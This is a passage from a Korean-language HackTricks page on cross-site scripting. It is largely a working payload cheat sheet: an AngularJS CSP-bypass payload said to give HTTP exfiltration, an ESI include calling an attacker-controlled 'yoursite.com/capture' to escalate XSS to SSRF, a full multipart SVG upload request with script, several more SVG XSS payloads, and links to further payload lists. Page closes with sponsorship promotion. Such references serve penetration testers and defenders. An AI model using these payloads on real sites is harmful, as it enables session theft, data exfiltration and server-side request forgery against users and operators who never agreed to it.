<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### 정규식 - 숨겨진 콘텐츠에 접근하기

[**이 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)에서는 JS에서 일부 값이 사라져도 다른 객체의 JS 속성에서 해당 값을 찾을 수 있다는 것을 알 수 있습니다. 예를 들어, 정규식의 입력 값은 정규식의 입력 값이 제거된 후에도 여전히 찾을 수 있습니다.
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### 무차별 대입 목록

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## 다른 취약점을 이용한 XSS

### Markdown에서의 XSS

렌더링될 마크다운 코드를 삽입할 수 있을까요? XSS를 얻을 수 있을지도 모릅니다! 확인해보세요:

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS에서 SSRF로

**캐싱을 사용하는 사이트**에서 XSS를 얻었나요? 이 페이로드를 사용하여 Edge Side Include Injection을 통해 **SSRF로 업그레이드**해보세요:
```python
<esi:include src="http://yoursite.com/capture" />
```
다음과 같은 기술을 사용하여 쿠키 제한, XSS 필터 등을 우회할 수 있습니다!\
이 기술에 대한 자세한 정보는 여기에서 확인할 수 있습니다: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### 동적으로 생성된 PDF에서의 XSS

웹 페이지가 사용자 제어 입력을 사용하여 PDF를 생성하는 경우, PDF를 생성하는 **봇을 속일 수** 있습니다.\
따라서, **PDF 생성 봇이** 어떤 종류의 **HTML** **태그를 찾으면**, 해당 태그를 **해석**하고, 이 동작을 **악용**하여 **서버 XSS**를 유발할 수 있습니다.

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

HTML 태그를 삽입할 수 없는 경우 **PDF 데이터를 삽입**해 볼 가치가 있습니다:

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### Amp4Email에서의 XSS

AMP는 모바일 기기에서 웹 페이지 성능을 가속화하기 위해 HTML 태그에 JavaScript를 보완하여 기능을 보장하고 속도와 보안에 중점을 둔 기술입니다. [AMP 구성 요소](https://amp.dev/documentation/components/?format=websites)를 통해 다양한 기능을 지원합니다.

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 형식은 특정 AMP 구성 요소를 이메일로 확장하여 수신자가 이메일 내에서 콘텐츠와 상호 작용할 수 있도록 합니다.

예시: [**Gmail의 Amp4Email에서의 XSS 취약점**](https://adico.me/post/xss-in-gmail-s-amp4email).

### 파일 업로드를 통한 XSS (svg)

다음과 같은 파일을 이미지로 업로드합니다 (출처: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)에서 **더 많은 SVG 페이로드를 찾을 수 있습니다.**

## 기타 JS 트릭 및 관련 정보

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSS 리소스

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: 해커들이 만든 프리미엄 버그 바운티 플랫폼인 **Intigriti에 가입하세요**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
